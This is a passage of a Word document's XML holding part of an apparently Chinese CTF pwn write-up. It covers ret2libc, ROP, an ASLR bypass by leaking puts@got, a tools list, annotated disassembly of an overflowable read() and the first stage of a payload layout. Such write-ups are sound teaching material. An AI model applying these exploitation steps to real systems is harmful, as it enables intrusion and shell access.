      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>• ret2libc：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>绕过 NX（不可执行栈），利用程序已加载的 libc 中的 system() 函数和 /bin/sh 字符串实现 getshell。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>• ROP（Return Oriented Programming）：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>通过精心构造栈上数据，将 puts@plt / system 等函数地址放置在返回地址位置，链式执行。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>• ASLR 绕过（泄露地址）：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>利用 puts(puts@got) 泄露 puts 在 libc 中的运行时地址，计算 libc 基址，从而得到 system 和 /bin/sh 的准确地址。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>• 函数 Epilogue 分析：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>识别带 ECX 恢复技巧的非标准 epilogue，选择有标准 leave;ret 的子函数路径，保证 ROP 链可靠执行。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:color w:val="2E74B5"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>6.2 解题工具清单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EEAF1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工具</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DEEAF1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用途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pwntools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Python exploit 框架，自动化与目标进程交互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Ghidra / objdump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反汇编与反编译，分析程序逻辑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checksec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检查二进制保护机制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GDB + pwndbg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动态调试，验证偏移、寄存器状态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patchelf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修改 ELF 的 interpreter 路径，使 32 位程序在 64 位系统运行</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:color w:val="1F497D"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>七、附录：关键汇编代码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:color w:val="2E74B5"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>子函数 0x804857b（漏洞触发函数，标准 epilogue）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>0804857b:</w:t>
        <w:br/>
        <w:t xml:space="preserve">  804857b:  push   %ebp</w:t>
        <w:br/>
        <w:t xml:space="preserve">  804857c:  mov    %esp,%ebp</w:t>
        <w:br/>
        <w:t xml:space="preserve">  804857e:  sub    $0x28,%esp          ; 分配 40 字节栈空间</w:t>
        <w:br/>
        <w:t xml:space="preserve">  8048584:  push   $0x8048800          ; "Cool! And whd did you choice it?"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  8048589:  call   puts@plt</w:t>
        <w:br/>
        <w:t xml:space="preserve">  8048591:  mov    0x804a060,%eax      ; 读取 size_var（已被篡改为 0xff）</w:t>
        <w:br/>
        <w:t xml:space="preserve">  8048596:  sub    $0x4,%esp</w:t>
        <w:br/>
        <w:t xml:space="preserve">  8048599:  push   %eax                ; arg3: count = 0xff = 255</w:t>
        <w:br/>
        <w:t xml:space="preserve">  804859a:  lea    -0x1c(%ebp),%eax   ; buffer = ebp - 28  ← 溢出起点</w:t>
        <w:br/>
        <w:t xml:space="preserve">  804859d:  push   %eax                ; arg2: buf</w:t>
        <w:br/>
        <w:t xml:space="preserve">  804859e:  push   $0x0                ; arg1: fd = 0</w:t>
        <w:br/>
        <w:t xml:space="preserve">  80485a0:  call   read@plt            ; ★ 漏洞：读 255 字节到 28 字节缓冲区</w:t>
        <w:br/>
        <w:t xml:space="preserve">  80485a8:  push   $0x8048821          ; "Good bye!"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  80485b0:  call   puts@plt</w:t>
        <w:br/>
        <w:t xml:space="preserve">  80485b9:  leave                      ; 标准 epilogue</w:t>
        <w:br/>
        <w:t xml:space="preserve">  80485ba:  ret                        ; ← EIP 被我们控制！</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:color w:val="2E74B5"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>栈布局示意图（overflow 后）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>高地址</w:t>
        <w:br/>
        <w:t>┌────────────────────────────┐</w:t>
        <w:br/>
        <w:t>│  main 的返回地址            │  ← ebp_func + 8</w:t>
        <w:br/>
        <w:t>├────────────────────────────┤</w:t>
        <w:br/>
        <w:t>│  main 的 saved EBP         │  ← ebp_func + 4</w:t>
        <w:br/>
        <w:t>├════════════════════════════╡</w:t>
        <w:br/>
        <w:t>│  子函数返回地址             │  ← ebp_func + 4   [偏移 32] ★ 覆盖为 puts@plt</w:t>
        <w:br/>
        <w:t>├────────────────────────────┤</w:t>
        <w:br/>
        <w:t>│  子函数 saved EBP           │  ← ebp_func       [偏移 28] 被覆盖为 'AAAA'</w:t>
        <w:br/>
        <w:t>├────────────────────────────┤</w:t>
        <w:br/>
        <w:t>│  ...（栈上其他数据）         │</w:t>
        <w:br/>
        <w:t>├────────────────────────────┤</w:t>
        <w:br/>
        <w:t>│  buffer[0..27]             │  ← ebp_func - 28  [偏移  0] ← read() 写入起点</w:t>
        <w:br/>
        <w:t>└────────────────────────────┘</w:t>
        <w:br/>
        <w:t>低地址</w:t>
        <w:br/>
        <w:br/>
        <w:t>payload 布局：</w:t>
        <w:br/>
        <w:t xml:space="preserve">  [  0 ~ 31 ]  b'A' * 32          → 填充至返回地址前</w:t>
        <w:br/>
        <w:t xml:space="preserve">  [ 32 ~ 35 ]  p32(PUTS_PLT)       → 返回地址 → 调用 puts(puts@got)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  [ 36 ~ 39 ]  p32(MAIN_ADDR)      → puts 的返回地址 → 重启 main</w:t>
        <w:br/>
        <w:t xml:space="preserve">  [ 40 ~ 43 ]  p32(PUTS_GOT)       → puts 的参数 → 泄露 puts 真实地址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